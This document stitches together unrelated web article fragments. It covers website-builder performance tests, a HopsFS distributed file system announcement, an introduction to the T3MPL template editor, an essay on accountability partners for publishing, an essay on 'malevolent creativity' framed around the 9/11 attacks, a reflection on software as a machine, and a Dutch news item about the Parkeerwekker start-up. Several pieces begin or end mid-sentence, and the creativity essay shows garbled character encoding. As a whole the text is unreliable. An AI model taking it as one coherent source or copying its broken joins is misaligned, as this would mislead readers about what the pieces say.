<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace-requests.png" alt="Squarespace request chart"></p>
<h3 id="weblium">Weblium</h3>
<p>Rendering of the Weblium site is blocked for a while due to various CSS files, including a 172 KB stylesheet with embedded web fonts.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium.png" alt="Weblium performance filmstrip"></p>
<p>After the initial render, Weblium launches a React app and starts downloading the background image. Later on in the process a 475 KB JavaScript file called <code>legacy.js</code> is loaded and run.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium-requests.png" alt="Weblium request chart"></p>
<h3 id="u-craft">UCraft</h3>
<p>The UCraft site starts rendering fairly quickly, but the background image is lazy loaded and depends on JavaScript code to run and trigger the image download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft.png" alt="UCraft performance filmstrip"></p>
<p>Once that JavaScript code has run, the page not only downloads the background image but also another 1.16MB that isn't used on the site but appears to be part of the template I used.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft-requests.png" alt="UCraft request chart"></p>
<h3 id="mozello">Mozello</h3>
<p>I tested Mozello as well, but didn't include it in the results because the free plan doesn't support HTTPS. HTTPS is good for security but slightly slows websites down, so it didn't feel like an apples to apples comparison.</p>
<p>Having said that, Mozello's mobile Lighthouse score of 83 was actually the highest overall score. I would expect Mozello sites to be fast even with HTTPS enabled.</p>
<p>With a page weight of 258 KB, Mozello also had the lowest download size. After the initial render there's no further network or CPU activity.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/mozello.png" alt="Mozello filmstrip"></p>

It is impossible to build a file/object storage system on AWS that can compete with S3 on cost. But what if you could build on top of S3 a distributed file system with a HDFS API that gives you POSIX goodness and improved performance? That’s what we have done with a cloud-native release of HopsFS that is highly available across availability zones, has the same cost as S3, but has 100X the performance of S3 for file move/rename operations, and 3.4X the read throughput of S3 (EMRFS) for the DFSIO Benchmark (peer reviewed at ACM Middleware 2020).</p></div><figure id="w-node-31b3b43a5a37-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65d314c5b6d0d5e4ae699_p4lO2294TIlBpyTyn36TMK3IC2UgJYIsOShNfA_v4ubinKblLQKOXG8rKcWnKuxoNJVGfRHWH69bEpG-twMaswNrBnv22mhMlGDVnW2SU3s1mRtQ-7BWL9kii4GleyV774hoZCE4.png" alt=""></p><figcaption><strong>HopsFS has lower latency and higher throughput than EMRFS (S3) for metadata operations (</strong><a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track"><strong>Middleware ‘20</strong></a><strong>).<br></strong></figcaption></figure><h2>The Dumb Bucket</h2><p>S3 has become the de-facto platform for storage in AWS due to its scalability, high availability, and low cost. However, S3 provides weaker guarantees and lower performance compared to distributed hierarchical file systems. Despite this, many developers erroneously believe that S3 is the end of file system history - there is no alternative to S3, so just re-write your applications to account for its limitations (such as slow and inconsistent file listings, non atomic file/dir rename, closed metadata, and limited change data capture (CDC) support). Azure has built an improved file system, <a href="https://docs.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction">Azure Data Lake Storage</a> (ADLS) V2, on top of Azure Blob Storage (ABS) service. ADLS provides a HDFS API to access data stored in a ABS container, giving improved performance and POSIX-like goodness. But, until today, there has been no equivalent to ADLS for S3. Today, we are launching HopsFS as part of <a href="https://www.hopsworks.ai/">Hopsworks</a>.</p><h2>Hierarchical File Systems strike back in the Cloud</h2><p>Hierarchical distributed file systems (like HDFS, CephFS, GlusterFS) were not scalable enough or highly available across availability zones in the cloud, motivating the move to S3 as the scalable storage service of choice. In addition to the technical challenges, AWS have priced virtual machine storage and inter-availability zone network traffic so high that no third party vendor could build a storage system that offers a per-byte storage cost close in price to S3.&nbsp;</p><p>However, the move to S3 has not been without costs. Many applications need to be rewritten as the stronger POSIX-like behaviour of hierarchical file systems (atomic move/rename, consistent file listings, consistent read-after-writes) has been replaced by weakened guarantees in S3. Even simple tasks, such as finding out what files you have, cannot be easily done on S3 when you have enough files, so a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/storage-inventory.html">new service was introduced</a> to enable you to pay extra to get a stale listing of your files. Most analytical applications (e.g., on EMR) use <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a>, instead of S3, which is a new metadata layer for S3 that provides slightly stronger guarantees than S3 - such as consistent file listings.</p><h2>File systems are making the same Journey as Databases</h2><p>The journey from a stronger POSIX-like file system to a weaker object storage paradigm and back again has parallels in the journey that databases have made in recent years. Databases made the transition from strongly consistent single-host systems (relational databases) to highly available (HA), eventually consistent distributed systems (NoSQL systems) to handle the massive increases in data managed by databases. However, <a href="https://www.singlestore.com/blog/why-nosql-databases-wrong-tool-for-modern-application/">NoSQL is just too hard for developers</a>, and databases are returning to strongly consistent (but now scalable) NewSQL systems, with databases such as Spanner, CockroachDB, SingleSQL, and MySQL Cluster.&nbsp;</p><p>In this blog, we show that distributed hierarchical file systems are completing a similar journey, going from strongly consistent POSIX-compliant file systems to object stores (with their weaker consistency models, but high availability across data centers), and back to distributed hierarchical file systems that are HA across data centers, without any loss in performance and, crucially, without any increase in cost, as we will use S3 as block storage for our file system.</p><h2>HopsFS</h2><p>HopsFS is a distributed hierarchical file system that provides a HDFS API (POSIX-like API), but stores its data in a bucket in S3. We redesigned HopsFS to (1) be <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">highly available across availability zones in the cloud</a> and (2) to <a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track">transparently use S3 to store the file’s blocks without sacrificing the file system’s semantics</a>. The original data nodes in HopsFS have now become stateless workers (part of a standard Hopsworks cluster) that include a new block caching service to leverage faster local VM storage for hot blocks. It is important to note that the cache is a global cache - not a local worker cache found in other vendor’s Spark workers - that includes secure access control to the cache. In our experiments, we show that HopsFS outperforms <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a> (S3 with metadata in DynamoDB for improved performance) for IO-bound workloads, with up to 20% higher performance and delivers up to 3.4X the aggregated read throughput of EMRFS. Moreover, we demonstrate that metadata operations on HopsFS (such as directory rename or file move) are up to two orders of magnitude faster than EMRFS. Finally, HopsFS opens up the currently closed metadata in S3, enabling correctly-ordered change notifications with HopsFS’ change data capture (CDC) API and customized extensions to metadata.&nbsp;</p><p>At Logical Clocks, we have leveraged HopsFS’ capabilities to build the industry’s first feature store for machine learning (<a href="https://docs.hopsworks.ai/">Hopsworks Feature Store</a>). The Hopsworks Feature Store is built on <a href="https://github.com/logicalclocks/hive">Hops Hive</a> and customized metadata extensions to HopsFS, ensuring strong consistency between the offline Feature Store, the online Feature Store (<a href="http://mikaelronstrom.blogspot.com/">NDB Cluster</a>), and data files in HopsFS.</p><figure id="w-node-f9d069e8e82e-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65dda6508bd64742b2b40_Screenshot%202020-11-19%20at%2012.58.07.png" loading="lazy" alt=""></p></figure><h3>Some of the key advantages of HopsFS/S3 are:</h3><h4><strong>POSIX-Like Semantics with a HDFS API</strong></h4><ul role="list"><li>Consistent file listings, consistent read-after-write, atomic rename (files/directories).</li></ul><h4><strong>Open, Extensible Metadata</strong></h4><ul role="list"><li><a href="https://hopsworks.readthedocs.io/en/stable/user_guide/hopsfs/xattrs.html">XAttr API</a> to attach arbitrary metadata to files/directories.</li></ul><h4><strong>Change Data Capture API</strong></h4><ul role="list"><li>Correctly ordered stream of file system mutation events delivered with low latency to downstream clients by <a href="https://ieeexplore.ieee.org/document/8752956">ePipe</a>.</li></ul><h4><strong>Free-Text search API for File System Namespace</strong></h4><ul role="list"><li>File system namespace metadata changes can be transparently replicated to Elasticsearch for low-latency free-text search of the namespace and its extended metadata. This service is provided by Hopsworks.</li></ul><h4><strong>X.509 Certificates for Authentication, TLS for Encryption-in-Transit</strong></h4><ul role="list"><li>HopsFS uses X.509 Certificates to identify and authenticate clients, with TLS providing end-to-end encryption-in-transit.&nbsp;</li></ul><h4><strong>Faster Metadata Operations</strong></h4><ul role="list"><li>File/directory rename/move, file listings - no limit on retrieving 1000 files-at-a-time (as in S3).&nbsp;</li></ul><h4><strong>Faster Read Operations</strong></h4><ul role="list"><li>Workers in HopsFS securely cache file blocks on behalf of clients using local VM storage.

EMRFS uses DynamoDB to store a partial replica of S3’s metadata (such as what files/directories are found in a given directory), enabling faster listing of files/dirs compared to S3 and <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-plan-consistent-view.html">stronger consistency</a> (consistent file listings and consistent read-after-update, although no atomic rename) .</p><p>Here are some selected results from our peer-reviewed research paper accepted for publication at ACM/IFIP Middleware 2020. The paper includes more results than shown below, and for writes, HopsFS is on-average about 90% of the performance of EMRFS - as HopsFS has the overhead of first writing to workers who then write to S3.&nbsp; HopsFS has a global worker cache (if the block is cached at any worker, clients will retrieve the data directly from the worker)&nbsp; for faster reads and the HopsFS’ metadata layer is built on NDB cluster for faster metadata operations.</p><figure id="w-node-b5601ef697cf-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65eaca9a96e19315a05e8_Screenshot%202020-11-19%20at%2013.01.36.png" loading="lazy" alt=""></p></figure><p>*Enhanced DFSIO Benchmark Results with 16 concurrent tasks reading 1GB files. For higher concurrency levels (64 tasks), the performance improvement drops from 3.4X to 1.7X.</p><p>**<a href="https://aws.amazon.com/about-aws/whats-new/2018/07/amazon-s3-announces-increased-request-rate-performance/#:~:text=Amazon%20S3%20now%20provides%20increased,time%20for%20no%20additional%20charge.">As of November 2020</a>, 3500 ops/sec is the maximum number of PUT/COPY/POST/DELETE per second per S3 prefix, while the maximum number of GET/HEAD requests per prefix is 5500 reads/sec. You can increase throughput in S3 by reading/writing in parallel to different prefixes, but this will probably require rewriting your application code and increasing the risk of bugs. For HopsFS (without S3), <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">we showed</a> that it can reach 1.6m metadata ops/sec across 3 availability zones.&nbsp;</p><p>In our <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">paper published at ICDCS</a>, we measured the throughput of HopsFS when deployed in HA mode over 3 availability zones. Using a workload from Spotify, we compared the performance with CephFS. HopsFS (1.6M ops/sec) reaches 2X the throughput of CephFS (800K ops/sec) when both are deployed in full HA mode. CephFS, however, does not currently support storing its data in S3 buckets.<br></p><h2>How do I get started with HopsFS?</h2><p>HopsFS is available as <a href="https://github.com/hopshadoop/hops">open-source</a> (Apache V2). However, cloud-native HopsFS is currently only available as part of the <a href="https://www.hopsworks.ai/">hopsworks.ai</a> platform. Hopsworks.ai is a platform for the design and operation of AI applications at scale with support for scalable compute in the form of Spark, Flink, TensorFlow, etc (comparable to Databricks or AWS EMR). You can also connect Hopsworks.ai to a Kubernetes cluster and launch jobs on Kubernetes that can read/write from HopsFS. You connect your cluster to a S3 bucket in your AWS account or on Azure to a Azure Blob Storage bucket. You can dynamically add/remove workers to/from your cluster, and the workers act as part of the HopsFS cluster - using minimal resources, but reading/writing to/from S3 or ABS on behalf of clients, providing access control, and caching blocks for faster retrieval.</p><h3>References</h3><ul role="list"><li>Ismail Mahmoud, Salman Niazi, Gautier Berthou, …</li></ul></div></div></div></div></div></div>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="🎹-template-contract">🎹 Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="👓-template">👓 Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="💥-generic-editor">💥 Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="🚀-publishing">🚀 Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="📣-summary">📣 Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>

For every article, video or painting we ask ourselves: who's gonna see this? What will they say? We feel vulnerable and viscerally adverse to putting our creative ideas out there. Our brains hate publishing. So we don't do it. We self-sabotage, we find excuses. We don't publish, we procrastinate. We hide behind feeds, we scroll. <br></p><p>‍</p><h2><strong>Publishing consistently is 21st century arbitrage</strong></h2><p>This is no secret: publishing frequently is the single best predictor of audience growth. As <a href="https://twitter.com/dickiebush" target="_blank">Dickie says</a>, it's the 21st century arbitrage.&nbsp;Standing out when everyone seeks attention requires consistency. Consistency is self-discipline's cherished son. Not a fun family if you ask me.</p><figure id="w-node-f693e3dffab2-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5fac2b175655bf23f866430e_Road%20to%20100k.jpg" loading="lazy" alt="Time and cadence to get to 100,000 followers on social media"></p><figcaption>Data averaging multiple accounts who reached 100k followers.&nbsp;We should mind survivorship bias implied here as well as the requirement to create quality content.</figcaption></figure><p>Freelancers, creators and entrepreneurs have no bosses and little external pressure.

And we're precisely the people who would benefit most from sharing our work more.</p><p>‍</p><h2><strong>The cheat code</strong></h2><p>Being accountable to someone else is a super hack. We might feel bad for not publishing work but we feel worse when we committed to someone else and we don't. Our brains trick us, so I advocate for tricking our minds back. No, the goal is not to feel terrible.

This just means that my accountability partners, Rob and Paul, have been a tiny bit more diligent than me. Given how many articles and products I've published, <em>it's totally worth it</em>.</p><blockquote>If you miss a deadline, instead of giving the financial stake to the other person, consider giving to a charity instead. Your loss aversion bias will still kick in, but it'll help humanity marginally more than your accountability partner, who probably doesn't need your money. To find the charities that save the most lives per dollar, check out <a href="https://givewell.org/" target="_blank">Givewell</a>'s rankings. And if that's your jam, go explore other <a href="https://80000hours.org/2020/08/misconceptions-effective-altruism/" target="_blank">effective altruism ideas</a>.</blockquote><p>‍</p><h2><strong>Going multiplayer</strong></h2><p>Publishing is a lonely journey and accountability partners help to enjoy the ride. Or rather, we can enjoy struggling together. A great accountability partner is challenging, openly gives feedback and is a tiny bit competitive. I can't overstate how beneficial it is to go from singleplayer to multiplayer mode. To a point where the mean becomes the end: a relationship I've engineered to publish more becomes more valuable than the publishing itself. Special shoutout to you, <a href="https://twitter.com/ungatedcreative">Rob</a>.</p><p>‍</p><h2><strong>Humans after all</strong></h2><p>Though we can positively influence our actions by reverse-engineer human psychology, we should avoid being prisoners of our own systems. Shit happens. We should give ourselves joker cards every once in a while. The goal here is healthy pressure, not dumb rigidity.</p><p>Accountability deals work if you admire your partner. Trying a deal for a bit with a trial is probably safe, and adjust or end with a polite message if it doesn't go as planned. It's also not gonna work if you don't vocalize your objectives. I've found that scheduling a monthly call to recap our progress is a worthy ritual. Talking to each other is key.</p><figure id="w-node-99cdf1e64ed9-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5fad10323e49012831e23f8c_Full%20equation.jpg" loading="lazy" alt=""></p></figure><p>Finally, accountability deals are velocity multipliers. Extrinsic motivation is an effective catalyst, it doesn't replace intrinsic motivation. No matter how hard you push, coaches you take and deals you sign up to, if you're not intrinsically motivated, you won't do it.</p><p>‍</p><h2>Make the deal</h2><ul role="list"><li><strong>Change your direction</strong>. First, your objectives need to be aligned to what you truly want. It's easy to get caught up following other people's desires (see <a href="https://www.youtube.com/watch?v=OgB9p2BA4fw&amp;ab_channel=ImitatioVideo">Mimetic desire</a>). If the long term requirement is consistency: you should find pleasure every time you publish. Or you'll abandon. Only then should you seek an accountability partner. Direction first, optimization second.</li><li><strong>Change your bio.</strong> Make your commitment public. In your email signatures, in your Twitter and LinkedIn bio "new articles every week". This was <a href="https://www.youtube.com/watch?v=wxsDnQKcq4Y&amp;feature=emb_title&amp;ab_channel=GarryTan">Garry Tan's trick</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When </strong><em><strong>Sputnik</strong></em><strong> launched</strong> in October 1957, the Western world reacted with shock. How could the Soviet Union have won the first leg of the space race? How was the United States, with all its technological and economic might, beaten into space? One answer was that creativity was the culprit: more specifically, a lack of it among US engineers.</p>
<p>But what is creativity? It turned out that the field of psychology already had an answer. In 1950, <span>J P Guilford,</span> president of the American Psychological Association, had <a href="https://doi.apa.org/doiLanding?doi=10.1037%2Fh0063487" rel="nofollow noreferrer noopener">described</a> his dissatisfaction with conventional explanations of human intellectual ability. They focused on <em>convergent</em> thinking: the ability to find and reproduce the right answer, such as <span>2 + 2 = 4.</span> Thatâ€™s vital to our lives, but Guilford argued that itâ€™s not all that matters. Our ability to generate many possible answers to a problem is also important â€“ in other words, <em>divergent</em> thinking. If the question is â€˜What equals 4?â€™ there is no single, correct answer. It could be <span>2 + 2,</span> but it could also be <span>3 + 1,</span> or even <span>0.25 + 3.75.</span> Divergent thinking would come to be seen as a hallmark of <a href="https://aeon.co/essays/how-did-creativity-become-an-engine-of-economic-growth" rel="noopener">creativity</a>.</p>
<p>Modern psychologyâ€™s approach to creativity was born in 1950, but it was the <em>Sputnik</em> shock of 1957 that turned attention to the role that creativity plays in the real world. Over the following decades, psychologists would come to understand that creativity is not merely a matter of how we think, but also a function of our personalities (some people are inclined to be more open-minded than others) and where we work or learn (some environments are more conducive to creativity than others, for example through encouraging free thinking). When all of these factors are favourably aligned, people are more likely to be able to generate ideas and products that solve problems in new and useful ways.</p>
<p>Defined this way, creativity has been associated strongly with beneficial outcomes. Whether the problem we are trying to solve is artistic (eg, how to capture the beauty of a landscape) or technological (eg, how to power a labour-saving machine), creativity leads to solutions that are new, unusual and surprising. Lives are improved as a result.</p>
<p>But then, on <span>11 September 2001,</span> a small group of men hijacked four commercial aircraft. They flew two into the Twin Towers of the World Trade Center in New York City; a third into the headquarters of the US Military, the Pentagon; and crashed the last into the Pennsylvania countryside, its intended target thought to be the White House. They killed <span>2,977 people,</span> injured more than 6,000 and caused more than <span>$40 billion</span> in damage, including collapsing the Twin Towers and destroying part of the Pentagon. No less important was how the event inflicted lasting psychological and economic damage. These men demonstrated that the problems people seek to solve, and the solutions they generate, donâ€™t have to be good. The competitive advantages of creativity are not confined to benign enterprises doing decent things. Creativity also has a dark side.</p>
<p>Itâ€™s true that, prior to the 9/11 attacks, researchers understood that creativity could result in bad outcomes. Their idea of <em>negative</em> <em>creativity</em> acknowledged that, even with the best will in the world, there could be unintended, undesirable consequences from creative solutions. The internal combustion engine has had an enormous, positive impact on the lives of billions of people. Yet every year, tens of thousands of people die as a result of car crashes, and our planetâ€™s atmosphere is choked with harmful emissions. Even so, weâ€™d never claim that George Brayton â€“ the American inventor of the first liquid-fuelled internal combustion engine in 1872 â€“ was trying to kill people. There was a negative element to his creativity, but not a malevolent one.</p>
<p>The 9/11 attacks were different. The death and destruction seen on that day was not an unfortunate byproduct of flying planes into buildings. It was the deliberate, intended purpose of terrorists. This was an example of what my colleagues and I have <a href="https://www.tandfonline.com/doi/abs/10.1080/10400410802059424" rel="nofollow noreferrer noopener">called</a> â€˜malevolent creativityâ€™ in action.</p>
<p>Whatever we think of 9/11, it is impossible to deny its novelty. It took the US by surprise</p>
<p><strong>To understand how</strong> and why 9/11 really was an example of <em>malevolent</em> <em>creativity</em> and not just an extreme criminal act, letâ€™s consider the event using the same theoretical framework that researchers use for any kind of creativity. Two qualities define creativity in products: effectiveness and novelty. Either on its own is not sufficient. As unpleasant as it is to keep a ledger, 9/11 was undeniably effective, not only in terms of the death toll and the physical damage, but also in terms of the lasting psychological effect on billions of people. As a solution to the problem of how to spread terror, it was wildly successful.</p>
<p>Creative products also need to be new and surprising because theyâ€™re responding to new problems. If youâ€™re a terrorist, the solution to spreading death and terror is not to try the same old things that terrorists have been doing for 50 years. If you do, your competitor â€“ in this case, police and security forces â€“ will know what to expect, and will have devised its own counter-solutions to your terrorist â€˜productsâ€™. The first time a terrorist smuggled a gun on a plane and hijacked it, he took everyone by surprise. Then metal detectors were installed in airports and the gun method was no longer novel or effective. Whatever we think of 9/11, it is impossible to deny its novelty. It took the US by surprise.</p>
<p>The question of whether 9/11 was truly malevolent and not just a form of negative creativity is even easier to determine. It was not a case of good intentions gone horribly wrong. These werenâ€™t nice guys who made an embarrassing mistake. They intended to harm others, and this was a necessary element of the overall event.</p>
<p>The fundamentals of how the 9/11 terrorists achieved their seismic act of malevolent creativity reflect what we know about the basis of ordinary creativity. First, they and their bosses had to think divergently. We can assume that someone â€“ perhaps even the Al-Qaeda leader Osama bin Laden himself â€“ must have consciously looked for many possible solutions to the problem of how to attack the US. Perhaps Al-Qaedaâ€™s leadership even held brainstorming workshops to try to uncover a creative solution: one that they knew would succeed because of its novelty.</p>
<p>We might speculate that at least some of the terrorists also had the kind of personality traits and dispositions that facilitate creativity, including an open-mindedness to consider alternative approaches, and a willingness to take risks, combined with sufficient conscientiousness to follow the plan diligently. Finally, they benefited from being embedded in a supportive environment. Companies know that innovation flourishes when creative individuals have the time, resources and encouragement they need. The 9/11 hijackers were well trained. They had the money they required to assimilate themselves in the US, learn to fly, and live comfortably and quietly among their intended victims. They werenâ€™t rushed, reducing their need to cut corners and lowering the risk of making mistakes. They were also supported in the sense of receiving moral encouragement to undertake their mission.</p>
<p>The 9/11 attacks showed us that the same thinking skills that resulted in smartphones and satellites can also result in scams and terrorism. The personal qualities associated with creativity â€“ openness, flexibility, tolerance of uncertainty and a dissatisfaction with the status quo â€“ can support the terrorist as much as the entrepreneur. Time, resources and support are as necessary to the successful hijacker as they are to an inventor. Taken altogether, creativity â€“ as a system of thinking skills, personality and environment, directed to finding novel and effective solutions to problems â€“ is a competitive advantage to the terrorist, as much as it is to the artist and engineer.</p>
<p>Our own preventative solutions to malevolent crime and terrorism must themselves be highly creative</p>
<p><strong>There is good news</strong> in all of this. By inverting what we know about fostering benevolent creativity, it ought to be possible to impede malevolent innovation. To help people develop and improve their capacity for benevolent creativity, teach them how to think divergently, develop their attitudes and dispositions to align better with creativity, and instruct managers in how to support creativity in the workplace. To prevent malevolent creativity, simply turn these initiatives on their head.</p>
<p>First, we have to devise ways to inhibit criminal and terrorist creativity. While we canâ€™t send hijackers to an anti-creativity workshop, we can target aspects of their personal attitudes and dispositions, just as we can create an unfavourable, unsupportive environment. If time, resources and support are vital components of creativity, then how can these be denied to the malevolent problem-solver?</p>
<p>One simple example, first introduced by the British government in 2003, was a hearts-and-minds component of a broader counter-terrorism strategy. Called â€˜Preventâ€™, this approach sought to address the risk of home-grown terrorism. Among several strands of activity, Prevent was designed to stop people being drawn into terrorism, to inhibit radicalisation, and to enhance community advice and support for at-risk individuals. Viewed through the lens of malevolent creativity, this approach focused not on the product â€“ the act of terrorism â€“ but on the person and the environment. If the individual motivation to commit an act of terror is removed, and if the environment doesnâ€™t support it â€“ if there are no resources, no safe haven, no encouragement and admiration â€“ then the system that is malevolent creativity collapses.</p>
<p>Second, we have to ensure that our own preventative solutions to malevolent crime and terrorism are themselves highly creative. The one mistake the 9/11 …</p></div></div></div>

        <p>Suppose all computers disappeared tomorrow from the Earth. No trace of transistors, microprocessors, electronic memory, even vacuum tubes or punchcards. Almost as if computers had never existed. But not all trace is gone. What remains is software – programs and data that computers could have used to perform useful work.</p>
<p>In this world of software <em>sans</em> computer, is software valuable?</p>
<p>Obviously, software without computers isn’t as useful, like a CD without a CD player. There’s no machine on which to execute software to produce useful effects, like playing a video or running a factory. But software without hardware is far from completely useless. Software is simply information about how to solve problems, and without special hardware on which to execute that solution efficiently, the solution still holds value as that knowledge. A program to compute a solution to an equation will still contain that same solution, if a person is capable of understanding it. A program to render some complex simulation still contains all the requisite knowledge, and a sufficiently dedicated scientist could reconstruct the solution perfectly, and recover that knowledge.</p>
<p>Now, imagine the alternative: what if all software disappeared from the planet, leaving only the shell of the hardware? Does an empty computer have value?</p>
<p>Again, obviously, a computer is at minimum valuable for its raw materials. The precious and pure metals used to construct a computer has some inherent, physical value. But the computer has lost most of the differentiating value as a machine – it can’t do anything useful. In fact, to recover the usefulness of a functional computer, the knowledge on which that computer operated must be completely re-constructed. The software must be created anew.</p>
<p>Software is the <em>soul of a machine</em>, the abstract essence that imbues the delicate, metamorphosed mazes of sand we call “computers” that divine ability to create and act on any knowledge, provided the right information. Conversely, the computer, the hardware, is only the means through which the physical world can experience software – it’s the interface between information and physics.</p>
<h2 id="software-the-machine">Software, the machine</h2>
<p><img src="https://thesephist.com/img/processor.jpg" alt="A microprocessor"></p>
<p>Take almost any machine in your life – say, a food blender. The food blender is a useful machine, but it’s a <em>special-purpose machine</em>. It does one thing: blend food. It makes no sense to try to modify a blender to do any other task. To change the blender’s job would be to create an entirely new machine, one that is no longer a food blender.</p>
<p>Some machines are multi-purpose. A backup generator to a building may be both a battery and a power generator. But such a machine is still a special-purpose machine: it only has two jobs. To modify a backup generator to, say, blend food, would be to create an entirely new machine.</p>
<p>Computers are different. Computers can do nearly anything, from calculating the trajectory of a rocket entering orbit to rendering the scene of a 3D video game, provided the right software. A computer is a <em>universal machine</em>. In fact, it’s the only contraption of its kind, the only universal machine that we know of. No other machine is universal. The computer owes its omnipotent universality to software. <em>Software</em> can be special-purpose, and the software that the computer executes determines its purpose.</p>
<p>This is an interesting anomaly. Almost all machines are special purpose, except computer hardware, which is truly general but also nearly useless without software; software itself is special-purpose to every use case.</p>
<p>I think the best way to make sense of this is that <strong>the software is the machine</strong>, the special-purpose apparatus that embodies the knowledge of a solution to a problem. The hardware of a computer is merely the interface through which the abstract machine of software interacts with the physical world, and with humans. The true machine in a running computer is the software within, and software is a new kind of machine, one that’s constructed not of atoms and chemicals grinding together, but of raw information, bits and bytes, colliding against each other.</p>
<h2 id="software-the-infinite">Software, the infinite</h2>
<p>Software is a machine unlike any other, not just because of its abstract nature, but because software operates in infinite space and unbounded time, or at least, the illusion of infinite space and unbounded time.</p>
<p>The specification for any physical, mechanical machine contains constraints on space and time. A design of a physical machine contains measurements of the machine’s size, its precision, and its operational speed and efficiency. These impose limits within which the physical machine can operate. Software, by contrast, is designed with no such limits in mind. There are software algorithms designed to be correct under the availability of infinite memory, or when executed forever. There are programs proven never to stop, and even programs whose fate is provably unpredictable – we don’t know how much time or space some software may need to ever fully execute.</p>
<p>Software exists outside the conventional limits of space and time. It just so happens that, for most software, the computers on which they execute have enough memory and speed that these limits are rarely encountered in practice.</p>
<p>Software also rebels against the tyranny of entropy – the abstract software-machine does not rust or age or become grimy with time. A program, once written correctly, will continue to work forever and indefinitely until the end of time, because its precision is infinite, and its moving parts are pure information. Given the right physical substrate, the right computer hardware that it can use to affect the outside world, software will work infinitely and indefinitely, charting the course of its internal state in the infinite theoretical fabric of digital data.</p>
<p>My fascination and love for software comes from these peerless properties, that software is both information and machine, executing atop a theoretical substrate infinite in both time and space, communicating with reality through a universal mechanical interface, never rusting or going out of use and capable of truly omnipotent utility. A perfect, boundless machine.</p>

    De gemeente wil een kort geding aanspannen als Parkeerwekker niet binnen zeven dagen zijn activiteiten staakt. Dat laatste is Luis Roman, initiatiefnemer van de dienst, niet van plan. “We zien dat er veel onnodige boetes worden uitgedeeld. Dat zorgt voor frustratie bij mensen,” zegt Roman. “Wij proberen met Parkeerwekker dit probleem op te lossen en zijn niet van plan om te stoppen.” De start-up heeft een advocaat in de arm genomen die de zaak nu onderzoekt.

  <p data-element-id="5848-ecf4-638a-90e5-1ab9-3bad-68cd-92d5">
